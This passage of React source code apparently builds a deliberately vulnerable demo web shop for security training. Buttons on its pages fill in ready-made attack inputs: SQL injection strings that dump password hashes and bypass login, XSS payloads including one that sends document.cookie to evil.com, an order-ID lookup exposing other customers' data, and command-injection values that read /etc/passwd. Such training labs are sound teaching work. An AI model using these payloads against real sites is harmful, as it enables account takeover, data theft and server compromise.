              <div className="flex items-center gap-1.5">
                <span className="size-3 rounded-full bg-red-500/80 shadow-sm" />
                <span className="size-3 rounded-full bg-amber-500/80 shadow-sm" />
                <span className="size-3 rounded-full bg-emerald-500/80 shadow-sm" />
              </div>

              {/* Navigation Arrows */}
              <div className="flex items-center gap-1 text-muted-foreground ml-1">
                <button
                  type="button"
                  onClick={() => navigateTo("store")}
                  className="rounded p-1 hover:bg-background/80 hover:text-foreground transition"
                  title="Back to Store"
                >
                  <ArrowLeft className="size-3.5" />
                </button>
                <button
                  type="button"
                  onClick={() => navigateTo("dashboard")}
                  className="rounded p-1 hover:bg-background/80 hover:text-foreground transition"
                  title="Forward to Dashboard"
                >
                  <ArrowRight className="size-3.5" />
                </button>
                <button
                  type="button"
                  onClick={() => {
                    setNavigating(true);
                    setTimeout(() => setNavigating(false), 200);
                  }}
                  className="rounded p-1 hover:bg-background/80 hover:text-foreground transition"
                  title="Reload"
                >
                  <RefreshCw className={cn("size-3.5", navigating && "animate-spin")} />
                </button>
              </div>

              {/* URL Address Bar */}
              <div className="flex flex-1 items-center gap-2 rounded-xl border border-border/50 bg-background/90 px-3 py-1.5 shadow-inner">
                <Lock className={cn("size-3.5 shrink-0", activeWaf ? "text-emerald-400" : "text-amber-400")} />
                <span className="flex-1 truncate font-mono text-xs text-foreground/80">
                  https://apex-cyberstore.io<span className="text-cyan-400 font-semibold">{urlPath}</span>
                </span>
                <span
                  className={cn(
                    "flex items-center gap-1 text-[9px] font-bold px-2 py-0.5 rounded-md",
                    activeWaf ? "bg-emerald-500/15 text-emerald-400" : "bg-red-500/15 text-red-400"
                  )}
                >
                  {activeWaf ? <Shield className="size-2.5" /> : <ShieldOff className="size-2.5" />}
                  {activeWaf ? "WAF PROXIED" : "UNPROTECTED"}
                </span>
              </div>
            </div>

            {/* Store Top Navigation Bar */}
            <div className="flex flex-wrap items-center justify-between border-b border-border/40 bg-gradient-to-r from-card via-muted/30 to-card px-4 py-2.5 gap-2">
              {/* Brand Logo */}
              <button
                type="button"
                onClick={() => navigateTo("store")}
                className="flex items-center gap-2 group text-left"
              >
                <div className="flex size-8 items-center justify-center rounded-xl bg-gradient-to-br from-cyan-500 to-blue-600 text-white font-black shadow-md">
                  ⚡
                </div>
                <div>
                  <span className="text-sm font-extrabold tracking-tight text-foreground group-hover:text-cyan-400 transition">
                    Apex CyberStore
                  </span>
                  <p className="text-[9px] text-muted-foreground uppercase tracking-wider font-semibold">
                    Enterprise Defense & Cloud
                  </p>
                </div>
              </button>

              {/* Navigation Menu Tabs */}
              <div className="flex items-center gap-1 overflow-x-auto">
                {[
                  { page: "store" as SitePage, label: "Store", icon: <Home className="size-3.5" /> },
                  { page: "cart" as SitePage, label: `Cart (${cart.reduce((a, b) => a + b.quantity, 0)})`, icon: <ShoppingCart className="size-3.5" /> },
                  { page: "search" as SitePage, label: "Docs", icon: <BookOpen className="size-3.5" /> },
                  { page: "tools" as SitePage, label: "Diagnostics", icon: <Wrench className="size-3.5" />, badge: "VULN" },
                  { page: "contact" as SitePage, label: "Support", icon: <Mail className="size-3.5" /> },
                  ...(currentUser
                    ? [
                        { page: "dashboard" as SitePage, label: "Dashboard", icon: <LayoutDashboard className="size-3.5" /> },
                        ...(currentUser.role.includes("Admin")
                          ? [{ page: "admin" as SitePage, label: "Admin Console", icon: <Unlock className="size-3.5 text-amber-400" />, badge: "SECRET" }]
                          : []),
                      ]
                    : []),
                ].map((item) => (
                  <button
                    key={item.page}
                    type="button"
                    onClick={() => navigateTo(item.page)}
                    className={cn(
                      "flex items-center gap-1.5 rounded-lg px-2.5 py-1.5 text-xs font-semibold transition-all relative",
                      currentPage === item.page
                        ? "bg-cyan-500/15 text-cyan-400 border border-cyan-500/30 shadow-sm"
                        : "text-muted-foreground hover:bg-muted/50 hover:text-foreground"
                    )}
                  >
                    {item.icon}
                    <span>{item.label}</span>
                    {item.badge && (
                      <span className="rounded bg-red-500/20 px-1 py-0.2 text-[8px] font-bold text-red-400 border border-red-500/30">
                        {item.badge}
                      </span>
                    )}
                  </button>
                ))}
              </div>

              {/* User Session Bar */}
              <div className="flex items-center gap-2">
                {currentUser ? (
                  <div className="flex items-center gap-2 rounded-xl border border-border/50 bg-background/80 px-2.5 py-1">
                    <span className="text-base">{currentUser.avatar}</span>
                    <div className="text-left leading-none">
                      <p className="text-[11px] font-bold text-foreground">{currentUser.name}</p>
                      <p className="text-[9px] text-muted-foreground">{currentUser.role}</p>
                    </div>
                    <button
                      type="button"
                      onClick={() => {
                        setCurrentUser(null);
                        toast.info("Logged out.");
                        navigateTo("store");
                      }}
                      className="ml-1 text-muted-foreground hover:text-red-400 transition"
                      title="Logout"
                    >
                      <LogOut className="size-3.5" />
                    </button>
                  </div>
                ) : (
                  <Button
                    size="sm"
                    variant="outline"
                    onClick={() => navigateTo("login")}
                    className="h-8 gap-1.5 text-xs font-bold rounded-xl border-cyan-500/40 text-cyan-400 hover:bg-cyan-500/10"
                  >
                    <Key className="size-3.5" /> Sign In
                  </Button>
                )}
              </div>
            </div>

            {/* In-Browser Alert Message */}
            {siteAlert && (
              <div
                className={cn(
                  "flex items-start justify-between border-b px-4 py-2.5 text-xs transition-all",
                  siteAlert.type === "error"
                    ? "border-red-500/30 bg-red-500/10 text-red-300"
                    : siteAlert.type === "warning"
                    ? "border-amber-500/30 bg-amber-500/10 text-amber-300"
                    : "border-emerald-500/30 bg-emerald-500/10 text-emerald-300"
                )}
              >
                <div className="flex items-start gap-2.5">
                  <span className="text-base">
                    {siteAlert.type === "error" ? "💥" : siteAlert.type === "warning" ? "🛡️" : "✅"}
                  </span>
                  <div>
                    <p className="font-bold">{siteAlert.title}</p>
                    <p className="text-[11px] opacity-90">{siteAlert.detail}</p>
                  </div>
                </div>
                <button
                  type="button"
                  onClick={() => setSiteAlert(null)}
                  className="text-muted-foreground hover:text-foreground ml-2"
                >
                  <X className="size-3.5" />
                </button>
              </div>
            )}

            {/* Active Exploit Popout Visualizer (Shows when an attack succeeds) */}
            {activeExploitDisplay && (
              <div className="border-b-2 border-red-500/40 bg-gradient-to-r from-red-950/40 via-red-900/20 to-red-950/40 p-4 transition-all animate-in fade-in slide-in-from-top-2">
                <div className="flex items-start justify-between">
                  <div className="flex items-center gap-2">
                    <span className="flex size-7 items-center justify-center rounded-lg bg-red-500/20 text-red-400 font-bold">
                      ⚠️
                    </span>
                    <div>
                      <h4 className="text-sm font-extrabold text-red-400">{activeExploitDisplay.title}</h4>
                      <p className="text-xs text-muted-foreground">{activeExploitDisplay.description}</p>
                    </div>
                  </div>
                  <Button
                    size="sm"
                    variant="ghost"
                    className="h-7 text-xs text-muted-foreground hover:text-foreground"
                    onClick={() => setActiveExploitDisplay(null)}
                  >
                    Dismiss
                  </Button>
                </div>

                <div className="mt-2.5 rounded-xl border border-red-500/30 bg-black/60 p-3 font-mono text-xs">
                  <p className="text-[10px] font-bold uppercase tracking-wider text-red-400 mb-1">
                    Captured Backend Exploit Evidence:
                  </p>
                  <pre className="overflow-x-auto text-[11px] text-emerald-400 leading-relaxed">
                    {activeExploitDisplay.evidence}
                  </pre>

                  {/* Render extracted table data if present */}
                  {Array.isArray(activeExploitDisplay.data) && (
                    <div className="mt-2 overflow-x-auto border-t border-red-500/20 pt-2">
                      <table className="w-full text-left text-[10px] text-foreground/80">
                        <thead>
                          <tr className="border-b border-border/40 text-red-400 font-bold">
                            <th className="py-1">Username</th>
                            <th className="py-1">Role</th>
                            <th className="py-1">Password Hash</th>
                            <th className="py-1">Exfiltrated Secret</th>
                          </tr>
                        </thead>
                        <tbody>
                          {activeExploitDisplay.data.map((row, idx) => (
                            <tr key={idx} className="border-b border-border/20 font-mono">
                              <td className="py-1 text-cyan-300">{row.user}</td>
                              <td className="py-1 text-amber-300">{row.role}</td>
                              <td className="py-1 text-muted-foreground">{row.pass_hash}</td>
                              <td className="py-1 text-red-300">{row.secret}</td>
                            </tr>
                          ))}
                        </tbody>
                      </table>
                    </div>
                  )}
                </div>
              </div>
            )}

            {/* ═══════════════════════════════════════════════════════════════
                PAGE ROUTER: Realistic Multi-Page View
            ════════════════════════════════════════════════════════════════ */}
            <div className="min-h-[520px] max-h-[720px] overflow-y-auto bg-background/95 p-5">
              {navigating ? (
                <div className="flex flex-col items-center justify-center py-28 gap-3">
                  <span className="size-8 animate-spin rounded-full border-3 border-cyan-400/30 border-t-cyan-400" />
                  <p className="text-xs text-muted-foreground font-mono">Loading resource from Apex server...</p>
                </div>
              ) : (
                <>
                  {/* ─────────────────────────────────────────────────────────────
                      PAGE 1: STORE / PRODUCT CATALOG
                  ────────────────────────────────────────────────────────────── */}
                  {currentPage === "store" && (
                    <div className="space-y-6">
                      {/* Hero Banner */}
                      <div className="relative overflow-hidden rounded-2xl bg-gradient-to-br from-cyan-900/60 via-blue-900/40 to-violet-950/60 p-6 border border-cyan-500/30 shadow-lg text-white">
                        <div className="relative z-10 max-w-lg">
                          <span className="inline-flex items-center gap-1.5 rounded-full bg-cyan-500/20 px-2.5 py-0.5 text-[10px] font-bold text-cyan-300 border border-cyan-500/30 mb-2">
                            🛡️ Next-Gen Zero Trust Hardware & SOC
                          </span>
                          <h1 className="text-2xl font-black tracking-tight">Enterprise Defense Store</h1>
                          <p className="mt-1.5 text-xs text-white/80 leading-relaxed">
                            Discover battle-tested security appliances, hardware tokens, and cloud defensive tools
                            protected by real-time WebGuard WAF inspection.
                          </p>
                          <div className="mt-4 flex flex-wrap gap-2">
                            <Button
                              size="sm"
                              onClick={() => {
                                setSelectedProduct(PRODUCTS[0]);
                                navigateTo("product");
                              }}
                              className="h-8 gap-1.5 text-xs font-bold rounded-xl bg-cyan-500 text-black hover:bg-cyan-400"
                            >
                              Explore Flagship Titan Key →
                            </Button>
                            <Button
                              size="sm"
                              variant="outline"
                              onClick={() => navigateTo("tools")}
                              className="h-8 gap-1.5 text-xs font-bold rounded-xl border-white/30 text-white hover:bg-white/10"
                            >
                              <Wrench className="size-3.5" /> Diagnostics Lab
                            </Button>
                          </div>
                        </div>
                        <div className="absolute -right-8 -top-8 size-48 rounded-full bg-cyan-500/10 blur-2xl" />
                      </div>

                      {/* Search Bar & Category Filters */}
                      <div className="flex flex-col gap-3">
                        <div className="flex flex-wrap gap-2 items-center justify-between">
                          {/* Search Input (Vulnerable to Reflected XSS & SQLi) */}
                          <div className="relative flex-1 min-w-[260px]">
                            <Search className="absolute left-3 top-1/2 size-4 -translate-y-1/2 text-muted-foreground" />
                            <Input
                              value={searchQuery}
                              onChange={(e) => handleStoreSearch(e.target.value)}
                              placeholder="Search products by keyword (e.g. 'Titan' or try attack payload)..."
                              className="h-9 pl-9 pr-20 font-mono text-xs border-border/60 bg-muted/30 focus-visible:ring-cyan-400"
                            />
                            {searchQuery && (
                              <button
                                type="button"
                                onClick={() => handleStoreSearch("")}
                                className="absolute right-2.5 top-1/2 -translate-y-1/2 text-muted-foreground hover:text-foreground"
                              >
                                <X className="size-3.5" />
                              </button>
                            )}
                          </div>

                          {/* Category Filter Pills */}
                          <div className="flex items-center gap-1.5 overflow-x-auto">
                            {[
                              { id: "all", label: "All Items" },
                              { id: "tokens", label: "Hardware Tokens" },
                              { id: "hardware", label: "Appliances" },
                              { id: "cloud", label: "Cloud Services" },
                              { id: "software", label: "DevSecOps" },
                            ].map((cat) => (
                              <button
                                key={cat.id}
                                type="button"
                                onClick={() => setSelectedCategory(cat.id)}
                                className={cn(
                                  "rounded-lg px-2.5 py-1 text-[11px] font-semibold transition",
                                  selectedCategory === cat.id
                                    ? "bg-cyan-500 text-black shadow-sm"
                                    : "bg-muted/40 text-muted-foreground hover:text-foreground hover:bg-muted"
                                )}
                              >
                                {cat.label}
                              </button>
                            ))}
                          </div>
                        </div>

                        {/* Quick Attack Injector for Search */}
                        <div className="rounded-xl border border-red-500/25 bg-red-500/[0.04] p-2.5 flex flex-wrap items-center gap-2">
                          <span className="text-[10px] font-bold uppercase tracking-wider text-red-400 flex items-center gap-1">
                            <Flame className="size-3.5" /> Quick Search Attacks:
                          </span>
                          {[
                            { label: "SQLi Union Dump", payload: "' UNION SELECT 1,username,password_hash,api_key FROM users--" },
                            { label: "Reflected XSS", payload: "<script>alert('XSS on ' + document.domain)</script>" },
                            { label: "SVG Onload XSS", payload: "<svg/onload=alert('XSS_Vector_1')>" },
                            { label: "Boolean SQLi", payload: "' OR 1=1--" },
                          ].map((atk) => (
                            <button
                              key={atk.label}
                              type="button"
                              onClick={() => handleStoreSearch(atk.payload)}
                              className="rounded-md border border-red-500/30 bg-red-500/10 px-2 py-0.5 text-[10px] font-mono text-red-300 hover:bg-red-500/20 transition"
                            >
                              {atk.label}
                            </button>
                          ))}
                        </div>
                      </div>

                      {/* Product Grid */}
                      <div className="grid grid-cols-1 gap-4 sm:grid-cols-2 md:grid-cols-3">
                        {filteredProducts.map((p) => (
                          <div
                            key={p.id}
                            className="group flex flex-col justify-between rounded-2xl border border-border/50 bg-card/60 p-4 transition-all hover:border-cyan-500/40 hover:shadow-lg hover:shadow-cyan-500/5"
                          >
                            <div>
                              <div className="flex items-start justify-between gap-2">
                                <span className="text-3xl p-2 rounded-xl bg-muted/50">{p.icon}</span>
                                {p.badge && (
                                  <span className="rounded-full bg-cyan-500/15 border border-cyan-500/30 px-2 py-0.5 text-[9px] font-bold text-cyan-300">
                                    {p.badge}
                                  </span>
                                )}
                              </div>

                              <h3 className="mt-3 font-bold text-sm text-foreground group-hover:text-cyan-400 transition">
                                {p.name}
                              </h3>
                              <p className="mt-1 text-[11px] text-muted-foreground line-clamp-2 leading-relaxed">
                                {p.description}
                              </p>

                              <div className="mt-3 flex items-center gap-1.5 text-[10px] text-amber-400">
                                <Star className="size-3 fill-amber-400" />
                                <span className="font-bold text-foreground">{p.rating}</span>
                                <span className="text-muted-foreground">({p.reviewsCount} reviews)</span>
                              </div>
                            </div>

                            <div className="mt-4 pt-3 border-t border-border/40 flex items-center justify-between">
                              <div>
                                <span className="text-[10px] text-muted-foreground">Price</span>
                                <p className="font-mono font-extrabold text-base text-foreground">${p.price.toFixed(2)}</p>
                              </div>
                              <div className="flex items-center gap-1.5">
                                <Button
                                  size="sm"
                                  variant="outline"
                                  onClick={() => {
                                    setSelectedProduct(p);
                                    navigateTo("product");
                                  }}
                                  className="h-8 text-xs font-semibold rounded-xl border-border/60 hover:border-cyan-500/50"
                                >
                                  Details
                                </Button>
                                <Button
                                  size="sm"
                                  onClick={() => {
                                    setCart((prev) => {
                                      const exist = prev.find((item) => item.product.id === p.id);
                                      if (exist) {
                                        return prev.map((item) =>
                                          item.product.id === p.id ? { ...item, quantity: item.quantity + 1 } : item
                                        );
                                      }
                                      return [...prev, { product: p, quantity: 1 }];
                                    });
                                    toast.success(`Added ${p.name} to Cart`);
                                  }}
                                  className="h-8 px-2.5 rounded-xl bg-cyan-500/15 text-cyan-300 hover:bg-cyan-500/30 border border-cyan-500/30"
                                  title="Add to Cart"
                                >
                                  <Plus className="size-3.5" />
                                </Button>
                              </div>
                            </div>
                          </div>
                        ))}
                      </div>
                    </div>
                  )}

                  {/* ─────────────────────────────────────────────────────────────
                      PAGE 2: PRODUCT DETAIL & CUSTOMER REVIEWS (STORED XSS)
                  ────────────────────────────────────────────────────────────── */}
                  {currentPage === "product" && selectedProduct && (
                    <div className="space-y-6">
                      <Button
                        variant="ghost"
                        size="sm"
                        onClick={() => navigateTo("store")}
                        className="gap-1.5 text-xs text-muted-foreground hover:text-foreground h-8"
                      >
                        <ArrowLeft className="size-3.5" /> Back to Catalog
                      </Button>

                      <div className="grid grid-cols-1 md:grid-cols-12 gap-6 items-start">
                        {/* Product Overview */}
                        <div className="md:col-span-5 rounded-2xl border border-border/50 bg-card/60 p-6 flex flex-col items-center text-center">
                          <span className="text-6xl p-6 rounded-3xl bg-muted/40 shadow-inner mb-4">
                            {selectedProduct.icon}
                          </span>
                          <h2 className="text-lg font-bold text-foreground">{selectedProduct.name}</h2>
                          <p className="mt-1 text-xs text-muted-foreground">{selectedProduct.description}</p>
                          <p className="mt-4 font-mono text-2xl font-black text-cyan-400">
                            ${selectedProduct.price.toFixed(2)}
                          </p>
                          <Button
                            onClick={() => {
                              setCart((prev) => [...prev, { product: selectedProduct, quantity: 1 }]);
                              toast.success(`Added to Cart`);
                              navigateTo("cart");
                            }}
                            className="mt-4 w-full h-9 rounded-xl font-bold text-xs bg-cyan-500 text-black hover:bg-cyan-400 gap-2"
                          >
                            <ShoppingCart className="size-4" /> Add to Cart & Checkout
                          </Button>
                        </div>

                        {/* Specs & Tech Details */}
                        <div className="md:col-span-7 space-y-4">
                          <div className="rounded-2xl border border-border/50 bg-card/60 p-5 space-y-3">
                            <h3 className="text-xs font-bold uppercase tracking-wider text-muted-foreground">
                              Technical Specifications & Security Attributes
                            </h3>
                            <div className="grid grid-cols-2 gap-2.5">
                              {selectedProduct.specs.map((spec, i) => (
                                <div key={i} className="flex items-center gap-2 rounded-xl bg-muted/40 p-2.5 text-xs">
                                  <CheckCircle2 className="size-3.5 text-emerald-400 shrink-0" />
                                  <span className="text-foreground/90 font-medium">{spec}</span>
                                </div>
                              ))}
                            </div>
                          </div>

                          {/* Customer Reviews Section (Stored XSS Target) */}
                          <div className="rounded-2xl border border-border/50 bg-card/60 p-5 space-y-4">
                            <div className="flex items-center justify-between">
                              <h3 className="text-sm font-bold text-foreground flex items-center gap-2">
                                <MessageSquare className="size-4 text-cyan-400" />
                                Customer Reviews ({reviews.length})
                              </h3>
                              <span className="text-[10px] text-muted-foreground">Community verified</span>
                            </div>

                            {/* Write Review Box */}
                            <div className="rounded-xl border border-border/60 bg-muted/20 p-3 space-y-3">
                              <div className="flex flex-wrap gap-2 items-center justify-between">
                                <Input
                                  value={newReviewAuthor}
                                  onChange={(e) => setNewReviewAuthor(e.target.value)}
                                  placeholder="Your Name / Handle"
                                  className="h-8 max-w-[200px] text-xs font-mono bg-background/80"
                                />
                                <div className="flex items-center gap-1">
                                  {[1, 2, 3, 4, 5].map((star) => (
                                    <button
                                      key={star}
                                      type="button"
                                      onClick={() => setNewReviewRating(star)}
                                      className="p-0.5"
                                    >
                                      <Star
                                        className={cn(
                                          "size-4",
                                          star <= newReviewRating
                                            ? "text-amber-400 fill-amber-400"
                                            : "text-muted-foreground"
                                        )}
                                      />
                                    </button>
                                  ))}
                                </div>
                              </div>

                              <Textarea
                                value={newReviewComment}
                                onChange={(e) => setNewReviewComment(e.target.value)}
                                placeholder="Share your review or test Stored XSS payload (e.g. <script>alert('XSS')</script>)..."
                                className="min-h-16 text-xs font-mono bg-background/80 resize-none"
                              />

                              {/* Quick Stored XSS Attack Pills */}
                              <div className="flex flex-wrap items-center gap-1.5 pt-1 border-t border-border/30">
                                <span className="text-[9px] font-bold text-red-400 uppercase tracking-wider">
                                  Stored XSS Pills:
                                </span>
                                {[
                                  "<script>alert('Stored XSS in Review')</script>",
                                  "<img src=x onerror=alert('Session Stolen!')>",
                                  "<svg/onload=fetch('http://evil.com/?c='+document.cookie)>",
                                ].map((payload) => (
                                  <button
                                    key={payload}
                                    type="button"
                                    onClick={() => setNewReviewComment(payload)}
                                    className="rounded border border-red-500/30 bg-red-500/10 px-1.5 py-0.5 font-mono text-[9px] text-red-300 hover:bg-red-500/20"
                                  >
                                    {payload.slice(0, 26)}...
                                  </button>
                                ))}
                                <Button
                                  size="sm"
                                  onClick={handleAddReview}
                                  className="ml-auto h-7 text-xs font-bold bg-cyan-500 text-black hover:bg-cyan-400"
                                >
                                  Post Review
                                </Button>
                              </div>
                            </div>

                            {/* Reviews Feed */}
                            <div className="space-y-2.5 max-h-56 overflow-y-auto pr-1">
                              {reviews.map((rev) => (
                                <div
                                  key={rev.id}
                                  className={cn(
                                    "rounded-xl border p-3 text-xs space-y-1 transition",
                                    rev.isExploit
                                      ? "border-red-500/40 bg-red-500/[0.06]"
                                      : "border-border/40 bg-muted/20"
                                  )}
                                >
                                  <div className="flex items-center justify-between">
                                    <span className="font-bold text-foreground flex items-center gap-1.5">
                                      <User className="size-3 text-muted-foreground" /> {rev.author}
                                      {rev.isExploit && (
                                        <span className="rounded bg-red-500/20 px-1 py-0.2 text-[8px] font-bold text-red-400">
                                          STORED XSS ACTIVE
                                        </span>
                                      )}
                                    </span>
                                    <span className="text-[10px] text-muted-foreground">{rev.date}</span>
                                  </div>
                                  <p className="text-muted-foreground font-mono text-[11px]">{rev.comment}</p>
                                </div>
                              ))}
                            </div>
                          </div>
                        </div>
                      </div>
                    </div>
                  )}

                  {/* ─────────────────────────────────────────────────────────────
                      PAGE 3: CART, CHECKOUT & ORDER LOOKUP (IDOR)
                  ────────────────────────────────────────────────────────────── */}
                  {currentPage === "cart" && (
                    <div className="space-y-6">
                      <h2 className="text-lg font-bold text-foreground flex items-center gap-2">
                        <ShoppingCart className="size-5 text-cyan-400" />
                        Shopping Cart & Order Tracking
                      </h2>

                      <div className="grid grid-cols-1 md:grid-cols-12 gap-6 items-start">
                        {/* Cart Items */}
                        <div className="md:col-span-7 space-y-4">
                          <div className="rounded-2xl border border-border/50 bg-card/60 p-4 space-y-3">
                            <h3 className="text-xs font-bold uppercase tracking-wider text-muted-foreground">
                              Cart Items ({cart.length})
                            </h3>
                            {cart.length === 0 ? (
                              <p className="text-xs text-muted-foreground py-6 text-center">Your cart is empty.</p>
                            ) : (
                              cart.map((item, idx) => (
                                <div
                                  key={idx}
                                  className="flex items-center justify-between border-b border-border/30 pb-3 last:border-0 last:pb-0"
                                >
                                  <div className="flex items-center gap-3">
                                    <span className="text-2xl p-2 rounded-xl bg-muted/40">{item.product.icon}</span>
                                    <div>
                                      <p className="text-xs font-bold text-foreground">{item.product.name}</p>
                                      <p className="text-[10px] text-muted-foreground">
                                        Qty: {item.quantity} · ${item.product.price.toFixed(2)} each
                                      </p>
                                    </div>
                                  </div>
                                  <div className="flex items-center gap-3">
                                    <span className="font-mono font-bold text-sm text-cyan-400">
                                      ${(item.product.price * item.quantity).toFixed(2)}
                                    </span>
                                    <button
                                      type="button"
                                      onClick={() => setCart((prev) => prev.filter((_, i) => i !== idx))}
                                      className="text-muted-foreground hover:text-red-400 transition"
                                    >
                                      <Trash2 className="size-3.5" />
                                    </button>
                                  </div>
                                </div>
                              ))
                            )}

                            {cart.length > 0 && (
                              <div className="pt-3 border-t border-border/40 flex justify-between items-center">
                                <span className="text-xs font-bold text-foreground">Total Checkout Amount:</span>
                                <span className="font-mono text-lg font-black text-foreground">
                                  ${cartTotal.toFixed(2)}
                                </span>
                              </div>
                            )}
                          </div>
                        </div>

                        {/* Order Tracking by ID (IDOR Vulnerability Target) */}
                        <div className="md:col-span-5 space-y-4">
                          <div className="rounded-2xl border border-red-500/30 bg-red-500/[0.04] p-5 space-y-3">
                            <div className="flex items-center gap-2">
                              <span className="flex size-6 items-center justify-center rounded-lg bg-red-500/20 text-red-400 text-xs font-bold">
                                🔓
                              </span>
                              <div>
                                <h3 className="text-xs font-bold text-red-400 uppercase tracking-wider">
                                  Track Order / Invoice (IDOR Lab)
                                </h3>
                                <p className="text-[10px] text-muted-foreground">
                                  Change the Order ID below to view other customer invoices without authorization.
                                </p>
                              </div>
                            </div>

                            <div className="flex gap-2">
                              <Input
                                value={orderLookupId}
                                onChange={(e) => setOrderLookupId(e.target.value)}
                                placeholder="Order ID (e.g. 1002)"
                                className="h-9 font-mono text-xs bg-background/80"
                              />
                              <Button
                                size="sm"
                                onClick={() => handleOrderLookup(orderLookupId)}
                                className="h-9 px-4 text-xs font-bold bg-red-500/20 text-red-300 border border-red-500/30 hover:bg-red-500/30"
                              >
                                Lookup
                              </Button>
                            </div>

                            {/* IDOR Test Pills */}
                            <div className="flex flex-wrap gap-1.5">
                              {["1001 (You)", "1002 (CFO VIP)", "1003 (Director)", "1004 (DBA)"].map((opt) => {
                                const idOnly = opt.split(" ")[0];
                                return (
                                  <button
                                    key={opt}
                                    type="button"
                                    onClick={() => {
                                      setOrderLookupId(idOnly);
                                      handleOrderLookup(idOnly);
                                    }}
                                    className="rounded-md border border-red-500/30 bg-red-500/10 px-2 py-0.5 text-[10px] font-mono text-red-300 hover:bg-red-500/20"
                                  >
                                    ID: {opt}
                                  </button>
                                );
                              })}
                            </div>

                            {/* Looked Up Order Result */}
                            {lookedUpOrder && (
                              <div
                                className={cn(
                                  "rounded-xl border p-3 text-xs space-y-2 font-mono transition-all",
                                  lookedUpOrder.isConfidential
                                    ? "border-red-500/50 bg-red-950/40 text-red-200"
                                    : "border-border/60 bg-muted/30 text-foreground"
                                )}
                              >
                                <div className="flex justify-between items-center border-b border-border/30 pb-1.5">
                                  <span className="font-bold">INVOICE #{lookedUpOrder.id}</span>
                                  <span className="rounded bg-emerald-500/20 text-emerald-400 px-1.5 py-0.2 text-[9px]">
                                    {lookedUpOrder.status}
                                  </span>
                                </div>
                                <p>
                                  <span className="text-muted-foreground">Customer:</span> {lookedUpOrder.customerName}
                                </p>
                                <p>
                                  <span className="text-muted-foreground">Email:</span> {lookedUpOrder.email}
                                </p>
                                <p>
                                  <span className="text-muted-foreground">Card on File:</span> ****-****-****-
                                  {lookedUpOrder.cardLast4}
                                </p>
                                <p>
                                  <span className="text-muted-foreground">Shipping:</span>{" "}
                                  {lookedUpOrder.shippingAddress}
                                </p>
                                <p className="font-bold text-cyan-300">
                                  <span className="text-muted-foreground">Total Invoiced:</span> $
                                  {lookedUpOrder.total.toFixed(2)}
                                </p>
                                {lookedUpOrder.isConfidential && (
                                  <p className="text-[10px] text-red-400 font-bold bg-red-500/20 p-1 rounded border border-red-500/30">
                                    ⚠️ IDOR BREACH: Unauthenticated access to Executive data!
                                  </p>
                                )}
                              </div>
                            )}
                          </div>
                        </div>
                      </div>
                    </div>
                  )}

                  {/* ─────────────────────────────────────────────────────────────
                      PAGE 4: AUTHENTICATION (SQL INJECTION LOGIN BYPASS)
                  ────────────────────────────────────────────────────────────── */}
                  {currentPage === "login" && (
                    <div className="max-w-md mx-auto space-y-6 py-4">
                      <div className="text-center space-y-1.5">
                        <div className="mx-auto flex size-12 items-center justify-center rounded-2xl bg-cyan-500/10 text-cyan-400 text-xl shadow-inner">
                          🔐
                        </div>
                        <h2 className="text-lg font-bold text-foreground">Sign In to Apex CyberStore</h2>
                        <p className="text-xs text-muted-foreground">
                          Access your organization's security appliances & dashboard
                        </p>
                      </div>

                      {/* Login Form */}
                      <form
                        onSubmit={(e) => {
                          e.preventDefault();
                          const form = e.currentTarget;
                          const uname = (form.elements.namedItem("uname") as HTMLInputElement).value;
                          const pword = (form.elements.namedItem("pword") as HTMLInputElement).value;
                          handleLoginSubmit(uname, pword);
                        }}
                        className="rounded-2xl border border-border/50 bg-card/60 p-5 space-y-4 shadow-xl"
                      >
                        <div>
                          <label className="block text-[11px] font-bold text-foreground/80 mb-1">
                            Username / Email
                          </label>
                          <Input
                            name="uname"
                            defaultValue="admin'--"
                            placeholder="admin or enter SQLi payload"
                            className="h-9 font-mono text-xs bg-background/80"
                          />
                        </div>

                        <div>
                          <label className="block text-[11px] font-bold text-foreground/80 mb-1">Password</label>
                          <Input
                            name="pword"
                            type="password"
                            defaultValue="password"
                            placeholder="••••••••"
                            className="h-9 font-mono text-xs bg-background/80"
                          />
                        </div>

                        <Button type="submit" className="w-full h-9 rounded-xl font-bold text-xs bg-cyan-500 text-black hover:bg-cyan-400">
                          Authenticate Session →
                        </Button>
                      </form>

                      {/* SQL Injection Quick Exploit Launcher */}
                      <div className="rounded-2xl border border-red-500/30 bg-red-500/[0.04] p-4 space-y-2.5">
                        <p className="text-[10px] font-bold uppercase tracking-wider text-red-400 flex items-center gap-1.5">
                          <Flame className="size-3.5" /> 1-Click SQLi Login Bypass Vectors:
                        </p>
                        <div className="flex flex-wrap gap-1.5">
                          {[
                            "admin'--",
                            "' OR '1'='1'--",
                            "admin'/*",
                            "' UNION SELECT 1,'admin','pass'--",
                          ].map((payload) => (
                            <button
                              key={payload}
                              type="button"
                              onClick={() => handleLoginSubmit(payload, "any_pass")}
                              className="rounded-md border border-red-500/30 bg-red-500/10 px-2 py-1 text-[10px] font-mono text-red-300 hover:bg-red-500/20 transition"
                            >
                              {payload}
                            </button>
                          ))}
                        </div>
                      </div>
                    </div>
                  )}

                  {/* ─────────────────────────────────────────────────────────────
                      PAGE 5: DIAGNOSTICS & SYSTEM DEV TOOLS (RCE / LFI / SSRF)
                  ────────────────────────────────────────────────────────────── */}
                  {currentPage === "tools" && (
                    <div className="space-y-6">
                      <div>
                        <h2 className="text-lg font-bold text-foreground flex items-center gap-2">
                          <Wrench className="size-5 text-cyan-400" />
                          System Diagnostics & Server Utility Console
                        </h2>
                        <p className="text-xs text-muted-foreground mt-0.5">
                          Internal developer utilities used to diagnose network connectivity, file storage, and webhook
                          integrations.
                        </p>
                      </div>

                      <div className="grid grid-cols-1 md:grid-cols-3 gap-5">
                        {/* 1. Network Health Ping (Command Injection CMDi) */}
                        <div className="rounded-2xl border border-border/50 bg-card/60 p-4 space-y-3 flex flex-col justify-between">
                          <div>
                            <div className="flex items-center gap-2 mb-1">
                              <Terminal className="size-4 text-emerald-400" />
                              <h3 className="text-xs font-bold text-foreground uppercase">1. Network Ping Tool</h3>
                            </div>
                            <p className="text-[10px] text-muted-foreground">
                              Executes system ping on target IP. Vulnerable to OS Command Injection.
                            </p>
                            <Input
                              value={pingHost}
                              onChange={(e) => setPingHost(e.target.value)}
                              className="mt-2 h-8 font-mono text-xs bg-background/80"
                              placeholder="8.8.8.8; whoami"
                            />
                            <div className="mt-2 flex flex-wrap gap-1">
                              {["8.8.8.8; whoami", "127.0.0.1 && cat /etc/passwd", "127.0.0.1 | dir"].map((p) => (
                                <button
                                  key={p}
                                  type="button"
                                  onClick={() => handlePingExecute(p)}
